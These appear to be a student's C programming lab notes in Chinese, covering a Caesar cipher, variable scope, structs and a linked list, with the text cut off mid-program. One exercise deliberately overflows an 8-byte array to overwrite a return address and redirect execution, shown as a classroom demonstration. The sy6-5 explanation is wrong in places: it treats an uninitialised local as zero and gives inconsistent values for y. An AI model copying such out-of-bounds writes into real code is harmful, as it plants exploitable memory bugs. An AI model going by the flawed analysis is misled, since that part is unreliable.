<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">encrypt</span><span class="params">(<span class="type">char</span> s[], <span class="type">int</span> d)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; s[i] != <span class="string">&#x27;\0&#x27;</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (s[i] &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; s[i] &lt;= <span class="string">&#x27;Z&#x27;</span>) &#123; </span><br><span class="line">            s[i] = (s[i] - <span class="string">&#x27;A&#x27;</span> + d + <span class="number">26</span>) % <span class="number">26</span> + <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (s[i] &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; s[i] &lt;= <span class="string">&#x27;z&#x27;</span>) &#123;</span><br><span class="line">            s[i] = (s[i] - <span class="string">&#x27;a&#x27;</span> + d + <span class="number">26</span>) % <span class="number">26</span> + <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> s[<span class="number">100</span>];</span><br><span class="line">    <span class="type">int</span> d;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;d);</span><br><span class="line">    <span class="built_in">encrypt</span>(s, d);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, s);</span><br><span class="line">    d = -d;</span><br><span class="line">    <span class="built_in">encrypt</span>(s, d);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, s);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="sy6-5">sy6-5</h2>
<p>打开C集成开发环境，建立一个sy6-5.cpp文件，输入以下代码，编译运行，并分析运行结果。理解局部变量和全局变量、动态变量与静态变量的区别。</p>
<p>#include &lt;stdio.h&gt;</p>
<p>int x;</p>
<p>void fun()</p>
<p>{</p>
<p>​ int x;</p>
<p>​ static int y;</p>
<p>​ x=x+1;</p>
<p>​ y=y+2;</p>
<p>​ printf(“fun:x=%d,y=%d”,x,y);</p>
<p>}</p>
<p>int main()</p>
<p>{</p>
<p>​ int y=0;</p>
<p>​ x=x+3;</p>
<p>​ y=y+4;</p>
<p>​ printf(“main1:x=%d,y=%d”,x,y);</p>
<p>​ fun();</p>
<p>​ printf(“main2:x=%d,y=%d”,x,y);</p>
<p>​ {</p>
<p>​ int x;</p>
<p>​ x++;y++;</p>
<p>​ printf(“main3:x=%d,y=%d”,x,y);</p>
<p>​ }</p>
<p>​ printf(“main4:x=%d,y=%d”,x,y);</p>
<p>​ fun();</p>
<p>​ x++;y++;</p>
<p>​ printf(“main5:x=%d,y=%d”,x,y);</p>
<p>​ return 0;</p>
<p>}</p>
<ol type="1">
<li><strong>全局变量</strong> (<code>int x</code>):
<ul>
<li>在整个程序中都可以访问。全局变量 <code>x</code> 在 <code>main</code>
函数和 <code>fun</code>
函数中都会被使用。默认初始化为0，<code>main</code> 中对 <code>x</code>
进行了加法操作，修改其值。</li>
<li>全局变量 <code>x</code> 的变化：
<ul>
<li><code>main1</code> 中：<code>x = 0 + 3 = 3</code></li>
<li><code>fun</code> 函数中，<code>x</code> 并没有在 <code>fun</code>
中被修改（<code>fun</code> 中有局部变量
<code>x</code>），所以它的值仍然是 3。</li>
<li><code>main5</code> 中，<code>x</code> 被加 1，最终值为 4。</li>
</ul></li>
</ul></li>
<li><strong>局部变量</strong> (<code>int y</code>):
<ul>
<li>每个局部变量只在其定义的函数或代码块内有效。<code>main</code> 中的
<code>y</code> 被赋值 0，并修改为 4，然后传递给 <code>fun</code>
函数。<code>fun</code> 函数中的 <code>y</code> 只在 <code>fun</code>
中有效。<code>main</code> 中的 <code>y</code> 在 <code>main</code>
的作用域内修改。</li>
<li>局部变量 <code>y</code> 的变化：
<ul>
<li><code>main1</code> 中：局部变量 <code>y</code> 从 0 加 4 变为
4。</li>
<li><code>main2</code> 中：<code>main</code> 中的 <code>y</code>
值未改变，所以输出 4。</li>
<li><code>main3</code> 中：局部变量 <code>x</code> 被定义，但与
<code>main</code> 和 <code>fun</code> 中的 <code>x</code>
无关。此时，局部 <code>y</code> 被加 1，结果是 5。</li>
<li><code>main4</code> 中：输出 <code>y</code> 为 4，因为
<code>main</code> 中的 <code>y</code> 在 <code>main3</code>
之后并未发生变化。</li>
<li><code>main5</code> 中：局部变量 <code>y</code> 仍然是 4，输出
5，因为它被加 1。</li>
</ul></li>
</ul></li>
<li><strong>静态变量</strong> (<code>static int y</code> in
<code>fun()</code>):
<ul>
<li>静态变量在函数调用之间保持其值，而不是每次调用时重新初始化。静态变量
<code>y</code> 的初值为 0。每次调用 <code>fun</code> 时，它的值会增加
2。</li>
<li>静态变量 <code>y</code> 的变化：
<ul>
<li>第一次调用 <code>fun</code> 时，<code>y</code> 增加 2，输出为
2。</li>
<li>第二次调用 <code>fun</code> 时，<code>y</code> 增加 2，输出为
4。</li>
</ul></li>
</ul></li>
<li><strong>局部变量 <code>x</code> in <code>fun()</code></strong>:
<ul>
<li>在 <code>fun</code> 函数中，局部变量 <code>x</code>
被初始化为默认值（0），并在每次调用时增加 1，但这不会影响全局变量
<code>x</code>。因此，<code>x = x + 1</code> 会输出局部变量
<code>x</code> 的值为 1，但每次都从 0 开始。</li>
</ul></li>
</ol>
<h3 id="总结-1">总结：</h3>
<ul>
<li><strong>全局变量</strong>：在整个程序中有效，值保持不变，除非显示修改。</li>
<li><strong>局部变量</strong>：仅在定义它的函数或代码块内有效，每次调用时会重新初始化。</li>
<li><strong>静态变量</strong>：在函数调用之间保持其值，初始值为
0，只会在第一次调用时初始化，之后每次调用都会累加。</li>
</ul>
<h2 id="sy6-6">sy6-6</h2>
<p>打开C集成开发环境，建立一个sy6-6.cpp文件，输入以下代码，编译运行，并分析运行结果。理解缓冲区溢出漏洞利用原理。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printtest</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">​    <span class="built_in">printf</span>(<span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">gettest</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">​    <span class="type">char</span> str[<span class="number">8</span>]=&#123;<span class="string">&#x27;0&#x27;</span>&#125;;</span><br><span class="line"></span><br><span class="line">​    <span class="type">int</span> p=(<span class="type">int</span>)&amp;printtest;</span><br><span class="line"></span><br><span class="line">​    <span class="type">char</span> ap[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">​    ap[<span class="number">0</span>]=p&gt;&gt;<span class="number">24</span> &amp; <span class="number">0x000000FF</span>; <span class="comment">//取地址的高字节</span></span><br><span class="line"></span><br><span class="line">​    ap[<span class="number">1</span>]=p&lt;&lt;<span class="number">8</span>&gt;&gt;<span class="number">24</span> &amp; <span class="number">0x000000FF</span>;<span class="comment">//取地址的第二字节</span></span><br><span class="line"></span><br><span class="line">​    ap[<span class="number">2</span>]=p&lt;&lt;<span class="number">16</span>&gt;&gt;<span class="number">24</span> &amp; <span class="number">0x000000FF</span>; <span class="comment">//取地址的第三字节</span></span><br><span class="line"></span><br><span class="line">​    ap[<span class="number">3</span>]=p&lt;&lt;<span class="number">24</span>&gt;&gt;<span class="number">24</span> &amp; <span class="number">0x000000FF</span>; <span class="comment">//取地址的末字节</span></span><br><span class="line"></span><br><span class="line">​    str[<span class="number">12</span>]=ap[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">​    str[<span class="number">13</span>]=ap[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">​    str[<span class="number">14</span>]=ap[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">​    str[<span class="number">15</span>]=ap[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">​    <span class="built_in">gettest</span>();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol></li>
</ul>
<h3 id="关键部分的解释">关键部分的解释：</h3>
<ol type="1">
<li><strong>函数地址存储</strong>：
<ul>
<li><code>int p = (int)&amp;printtest;</code> 通过
<code>&amp;printtest</code> 获取 <code>printtest</code>
函数的内存地址，并将其强制转换为 <code>int</code>
类型。这将获取函数的地址（假设函数地址适配 <code>int</code> 类型，即 32
位系统）。</li>
</ul></li>
<li><strong>地址的字节拆分</strong>：
<ul>
<li>使用位运算，将 <code>p</code> 地址分成 4 个字节，并存储到
<code>ap</code> 数组中。这样就能得到 <code>printtest</code>
函数的地址的每个字节。</li>
</ul></li>
<li><strong>缓冲区溢出</strong>：
<ul>
<li><code>str[8]</code> 是一个大小为 8 的字符数组，但是接下来将
<code>ap[0]</code> 到 <code>ap[3]</code> 存储到 <code>str[12]</code> 到
<code>str[15]</code>。这是典型的缓冲区溢出，因为 <code>str</code>
数组只有 8 个元素，而你尝试访问和修改第 12、13、14 和 15
个元素，这会导致溢出，并修改内存中其他地方的数据。</li>
</ul></li>
<li><strong>程序的潜在影响</strong>：
<ul>
<li>由于溢出的操作覆盖了内存中的其他部分，它可能会影响程序的控制流或数据。</li>
<li>此程序没有明确调用 <code>printtest</code>
函数，但因为溢出操作改变了栈上的数据，程序实际上可能会通过修改返回地址等方式，使得执行控制流跳转到
<code>printtest</code>，并且执行
<code>printf("test")</code>。这就是所谓的缓冲区溢出漏洞，攻击者可以利用这个漏洞控制程序的执行。</li>
</ul></li>
</ol>
<h3 id="编译和运行结果">编译和运行结果：</h3>
<ul>
<li><strong>执行时</strong>：程序会运行 <code>gettest()</code>
函数，并试图访问 <code>str[12]</code> 到 <code>str[15]</code>，这是超出
<code>str</code>
数组的有效范围的，这会导致未定义行为，可能会修改栈上的其他数据。</li>
<li><strong>潜在输出</strong>：在某些情况下，这种溢出操作会修改栈上的返回地址或其他控制数据，从而导致程序跳转到
<code>printtest</code> 函数并输出 <code>test</code>。</li>
</ul>
<h3 id="理解缓冲区溢出漏洞利用原理">理解缓冲区溢出漏洞利用原理：</h3>
<p>缓冲区溢出漏洞是通过向一个缓冲区（如数组）写入超过其容量的数据，进而覆盖相邻内存区域的内容。当溢出覆盖了栈上的控制信息（如返回地址、函数参数等）时，攻击者可以控制程序的执行流，使其跳转到任意地址（比如恶意代码或某个已知函数地址），从而执行攻击者指定的操作。</p>
<p>在这个程序中，<code>str</code>
数组的溢出会修改栈上的其他数据（例如返回地址），从而可能让程序跳转到
<code>printtest</code> 函数，输出 <code>test</code>。</p>
<h3 id="总结-2">总结：</h3>
<ul>
<li><strong>缓冲区溢出</strong>：通过向数组中写入超过其容量的数据，修改程序控制流或破坏内存内容。</li>
<li><strong>漏洞利用</strong>：攻击者可以利用这个漏洞控制程序的执行流，执行任意代码。</li>
<li><strong>改进</strong>：应避免直接操作数组下标，确保访问数组时不超出其边界，防止缓冲区溢出问题。</li>
</ul>
<h1 id="实验七24.12.12">实验七（24.12.12）</h1>
<h2 id="section">7-1</h2>
<p>打开C集成开发环境，建立一个sy7-1.cpp文件，编写一程序求两个复数之和。要求：首先定义一个表示复数的结构体struct
complex，包含两个成员：实部x（int型）和虚部y（int
型）；然后写一个函数struct complex add(struct complex a, struct complex
b)求两个复数之和；最后在main函数中输入两个复数的实部和虚部，调用add函数后，输出两复数之和。例如：</p>
<p>输入：3 5 4 -7</p>
<p>输出：7-2i</p>
<p>输入：20 30 -30 -20</p>
<p>输出：-10+10i</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">complex</span> &#123;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    <span class="type">int</span> y;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">complex</span> <span class="built_in">add</span>(<span class="keyword">struct</span> complex a, <span class="keyword">struct</span> complex b) &#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">complex</span> result;</span><br><span class="line">    result.x = a.x + b.x;</span><br><span class="line">    result.y = a.y + b.y; </span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">complex</span> num1, num2, result;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d %d&quot;</span>, &amp;num<span class="number">1.</span>x, &amp;num<span class="number">1.</span>y, &amp;num<span class="number">2.</span>x, &amp;num<span class="number">2.</span>y);</span><br><span class="line">    result = <span class="built_in">add</span>(num1, num2);</span><br><span class="line">    <span class="keyword">if</span> (result.y &gt;= <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d+%di\n&quot;</span>, result.x, result.y);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d%di\n&quot;</span>, result.x, result.y); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="section-1">7-2</h2>
<p>打开C集成开发环境，建立一个sy7-2.cpp文件，编写一程序对学生成绩进行处理，学生的信息包括学号（字符不超过10个）、姓名（字符不超过10个，不含空格）、3门课程的成绩（float型）以及平均分（float型）。要求：先定义一个表示学生信息的结构体struct
student；然后定义3个函数，分别用于输入数据（含计算平均分）void
input_data(struct student stu[ ],int n)、按平均分升序排序void
sort(struct student stu[ ],int n)和输出数据void print_data(struct
student stu[ ],int
n)；最后在main函数中输入学生人数n，依次调用input_data(stu,n)、sort(stu,n)和print_data(stu,n)函数。输入输出时每个数据间用一个空格隔开，成绩及平均分的小数保留1位。例如：</p>
<p>输入：3</p>
<p>00001 zhangsan 89 78 67</p>
<p>00002 lisi 70 66 72</p>
<p>00003 wangwu 78 77 70</p>
<p>输出：00002 lisi 70.0 66.0 72.0 69.3</p>
<p>00003 wangwu 78.0 77.0 70.0 75.0</p>
<p>00001 zhangsan 89.0 78.0 67.0 78.0</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义学生信息结构体</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">student</span> &#123;</span><br><span class="line">    <span class="type">char</span> id[<span class="number">11</span>];          <span class="comment">// 学号</span></span><br><span class="line">    <span class="type">char</span> name[<span class="number">11</span>];        <span class="comment">// 姓名</span></span><br><span class="line">    <span class="type">float</span> scores[<span class="number">3</span>];      <span class="comment">// 3门课程成绩</span></span><br><span class="line">    <span class="type">float</span> average;        <span class="comment">// 平均分</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输入数据函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">input_data</span><span class="params">(<span class="keyword">struct</span> student stu[], <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s %s %f %f %f&quot;</span>, stu[i].id, stu[i].name, </span><br><span class="line">              &amp;stu[i].scores[<span class="number">0</span>], &amp;stu[i].scores[<span class="number">1</span>], &amp;stu[i].scores[<span class="number">2</span>]);</span><br><span class="line">        <span class="comment">// 计算平均分</span></span><br><span class="line">        stu[i].average = (stu[i].scores[<span class="number">0</span>] + stu[i].scores[<span class="number">1</span>] + stu[i].scores[<span class="number">2</span>]) / <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 按平均分升序排序函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sort</span><span class="params">(<span class="keyword">struct</span> student stu[], <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n - <span class="number">1</span> - i; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (stu[j].average &gt; stu[j + <span class="number">1</span>].average) &#123;</span><br><span class="line">                <span class="keyword">struct</span> <span class="title class_">student</span> temp = stu[j];</span><br><span class="line">                stu[j] = stu[j + <span class="number">1</span>];</span><br><span class="line">                stu[j + <span class="number">1</span>] = temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出数据函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print_data</span><span class="params">(<span class="keyword">struct</span> student stu[], <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s %s %.1f %.1f %.1f %.1f\n&quot;</span>, </span><br><span class="line">               stu[i].id, stu[i].name, </span><br><span class="line">               stu[i].scores[<span class="number">0</span>], stu[i].scores[<span class="number">1</span>], stu[i].scores[<span class="number">2</span>], </span><br><span class="line">               stu[i].average);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n); <span class="comment">// 输入学生人数</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">student</span> stu[n];</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">input_data</span>(stu, n);  <span class="comment">// 输入学生数据</span></span><br><span class="line">    <span class="built_in">sort</span>(stu, n);        <span class="comment">// 按平均分排序</span></span><br><span class="line">    <span class="built_in">print_data</span>(stu, n);  <span class="comment">// 输出学生数据</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="section-2">7-3</h2>
<p>打开C集成开发环境，建立一个sy7-3.cpp文件，编写一个程序使用链表操作学生信息，学生的信息包括学号（字符不超过10个）、姓名（字符不超过10个，不含空格）和年龄（int型）。要求：先定义一个表示学生信息的结点struct
student；然后定义5个函数，分别用于：创建一个带有头结点的链表（头插法，按学号降序输入数据，学生个数为n，本函数中输入）函数struct
student
<em>create()、插入数据（任意位置插入，保持学号有序，新生信息结点由main传递过来）函数void
insert(struct student </em>h, struct student
<em>x)、删除数据（删除指定学号的学生数据，学号由main传递过来）函数void
dele (struct student </em>h,char num[])、输出数据函数void print(struct
student *h)和菜单（用于显示1. create、2. insert、3. delete、4. print和0.
exit）函数void
menu()；最后在main函数中用一个死循环实现可重复显示菜单及通过输入整数（0~4）选择调用相应功能函数。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义学生信息结点</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">student</span> &#123;</span><br><span class="line">    <span class="type">char</span> id[<span class="number">11</span>];        <span class="comment">// 学号</span></span><br><span class="line">    <span class="type">char</span> name[<span class="number">11</span>];      <span class="comment">// 姓名</span></span><br><span class="line">    <span class="type">int</span> age;            <span class="comment">// 年龄</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">student</span> *next; <span class="comment">// 指向下一个结点</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建链表（头插法，按学号降序输入数据）</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">student</span> *<span class="built_in">create</span>() &#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">student</span> *head = (<span class="keyword">struct</span> student *)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(<span class="keyword">struct</span> student));</span><br><span class="line">    head-&gt;next = <span class="literal">NULL</span>; <span class="comment">// 初始化头结点</span></span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter the number of students: &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">student</span> *new_node = (<span class="keyword">struct</span> student *)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(<span class="keyword">struct</span> student));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Enter student ID, name, and age: &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s %s %d&quot;</span>, new_node-&gt;id, new_node-&gt;name, &amp;new_node-&gt;age);</span><br><span class="line">        <span class="comment">// 插入到链表的头部</span></span><br><span class="line">        new_node-&gt;next = head-&gt;next;</span><br><span class="line">        head-&gt;next = new_node;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 插入数据（保持学号有序）</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">insert</span><span class="params">(<span class="keyword">struct</span> student *h, <span class="keyword">struct</span> student *x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">student</span> *prev = h, *curr = h-&gt;next;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (curr &amp;&amp; <span class="built_in">strcmp</span>(curr-&gt;id, x-&gt;id) &gt; <span class="number">0</span>) &#123; <span class="comment">// 查找插入位置</span></span><br><span class="line">        prev = curr;</span><br><span class="line">        curr = curr-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    x-&gt;next = curr;  <span class="comment">// 插入到链表中</span></span><br><span class="line">    prev-&gt;next = x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除指定学号的学生数据</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dele</span><span class="params">(<span class="keyword">struct</span> student *h, <span class="type">char</span> num[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">student</span> *prev = h, *curr = h-&gt;next;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (curr &amp;&amp; <span class="built_in">strcmp</span>(curr-&gt;id, num) != <span class="number">0</span>) &#123; <span class="comment">// 查找要删除的结点</span></span><br><span class="line">        prev = curr;</span><br><span class="line">        curr = curr-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (curr) &#123; <span class="comment">// 找到并删除</span></span><br><span class="line">        prev-&gt;next = curr-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(curr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Deleted student with ID: %s\n&quot;</span>, num);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Student with ID %s not found.\n&quot;</span>, num);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出数据</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">(<span class="keyword">struct</span> student *h)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">student</span> *curr = h-&gt;next;</span><br><span class="line">    <span class="keyword">while</span> (curr) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ID: %s, Name: %s, Age: %d\n&quot;</span>, curr-&gt;id, curr-&gt;name, curr-&gt;age);</span><br><span class="line">        curr = curr-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 菜单函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">menu</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nMenu:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;1. Create\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;2. Insert\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;3. Delete\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;4. Print\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0. Exit\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">student</span> *head = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">menu</span>(); <span class="comment">// 显示菜单</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Enter your choice: &quot;</span>);</span><br><span class="line">        <span class="type">int</span> choice;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;choice);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (choice == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>; <span class="comment">// 退出程序</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (choice) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>: <span class="comment">// 创建链表</span></span><br><span class="line">                head = <span class="built_in">create</span>();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>: &#123; <span class="comment">// 插入数据</span></span><br><span class="line">                <span class="keyword">if</span> (!head) &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;Create the list first.\n&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">struct</span> <span class="title class_">student</span> *new_node = (<span class="keyword">struct</span> student *)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(<span class="keyword">struct</span> student));</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Enter student ID, name, and age: &quot;</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot;%s %s %d&quot;</span>, new_node-&gt;id, new_node-&gt;name, &amp;new_node-&gt;age);</span><br><span class="line">                <span class="built_in">insert</span>(head, new_node);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>: &#123; <span class="comment">// 删除数据</span></span><br><span class="line">                <span class="keyword">if</span> (!head) &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;Create the list first.\n&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">char</span> id[<span class="number">11</span>];</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Enter the student ID to delete: &quot;</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, id);</span><br><span class="line">                <span class="built_in">dele</span>(head, id);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span 